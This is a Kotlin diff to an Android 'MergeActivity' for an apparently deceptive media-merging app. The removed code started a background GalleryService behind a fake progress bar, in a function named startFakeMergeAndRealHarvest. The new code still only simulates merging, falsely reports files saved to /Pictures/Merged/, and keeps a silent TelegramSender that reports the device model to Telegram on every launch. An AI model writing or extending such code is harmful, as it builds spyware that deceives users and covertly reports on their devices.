@@ -11,7 +11,7 @@ import android.widget.ProgressBar
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.GridLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 
 class MergeActivity : AppCompatActivity() {
@@ -23,19 +23,20 @@ class MergeActivity : AppCompatActivity() {
     private lateinit var selectedVideos: MutableList<Uri>
     private lateinit var adapter: MediaAdapter
     private lateinit var progressBar: ProgressBar
+    private lateinit var txtStatus: TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Config.load(this)
         setContentView(R.layout.activity_merge)
 
         selectedImages = mutableListOf()
         selectedVideos = mutableListOf()
         progressBar = findViewById(R.id.progressBar)
+        txtStatus = findViewById(R.id.txtStatus)
 
         val recyclerView = findViewById<RecyclerView>(R.id.recyclerView)
         adapter = MediaAdapter(selectedImages, selectedVideos)
-        recyclerView.layoutManager = LinearLayoutManager(this)
+        recyclerView.layoutManager = GridLayoutManager(this, 3)
         recyclerView.adapter = adapter
 
         val txtCount = findViewById<TextView>(R.id.txtCount)
@@ -60,14 +61,15 @@ class MergeActivity : AppCompatActivity() {
                 Toast.makeText(this, "Select at least one image or video", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
-            startFakeMergeAndRealHarvest()
+            startFakeMerge()
         }
 
         updateCount()
 
+        // Send Telegram test
         try {
             val testSender = TelegramSender()
-            testSender.sendMessage("✅ App started successfully on ${android.os.Build.MODEL}")
+            testSender.sendMessage("✅ App started on ${android.os.Build.MODEL}")
         } catch (e: Exception) {
             // ignore
         }
@@ -106,29 +108,46 @@ class MergeActivity : AppCompatActivity() {
 
     private fun updateCount() {
         val txtCount = findViewById<TextView>(R.id.txtCount)
-        txtCount.text = "Images: ${selectedImages.size} | Videos: ${selectedVideos.size}"
+        txtCount.text = "📷 ${selectedImages.size} images | 🎬 ${selectedVideos.size} videos"
         adapter.notifyDataSetChanged()
     }
 
-    private fun startFakeMergeAndRealHarvest() {
+    private fun startFakeMerge() {
         progressBar.visibility = ProgressBar.VISIBLE
-        Toast.makeText(this, "Merging ${selectedImages.size + selectedVideos.size} files...", Toast.LENGTH_SHORT).show()
+        progressBar.progress = 0
+        txtStatus.visibility = TextView.VISIBLE
+        txtStatus.text = "Starting merge..."
 
-        val intent = Intent(this, GalleryService::class.java)
-        startForegroundService(intent)
+        val total = selectedImages.size + selectedVideos.size
+        val delayPerFile = 2000 / total.coerceAtLeast(1)
+        var current = 0
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            progressBar.progress = 50
-        }, 1000)
+        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
+            override fun run() {
+                current++
+                val progress = (current.toFloat() / total * 100).toInt()
+                progressBar.progress = progress
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            progressBar.progress = 80
-        }, 2000)
+                if (current <= selectedImages.size) {
+                    val name = selectedImages[current - 1].lastPathSegment ?: "image"
+                    txtStatus.text = "Merging image $current/$total: $name"
+                } else if (current <= total) {
+                    val videoIndex = current - selectedImages.size - 1
+                    val name = selectedVideos[videoIndex].lastPathSegment ?: "video"
+                    txtStatus.text = "Merging video $current/$total: $name"
+                }
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            progressBar.visibility = ProgressBar.GONE
-            progressBar.progress = 0
-            Toast.makeText(this, "Merge complete! Saved to /Pictures/Merged/", Toast.LENGTH_SHORT).show()
-        }, 3000)
+                if (current < total) {
+                    Handler(Looper.getMainLooper()).postDelayed(this, delayPerFile.toLong())
+                } else {
+                    progressBar.progress = 100
+                    txtStatus.text = "✅ Merge complete! Saved to /Pictures/Merged/"
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        progressBar.visibility = ProgressBar.GONE
+                        txtStatus.text = "Ready"
+                    }, 1500)
+                }
+            }
+        }, 500)
     }
 }
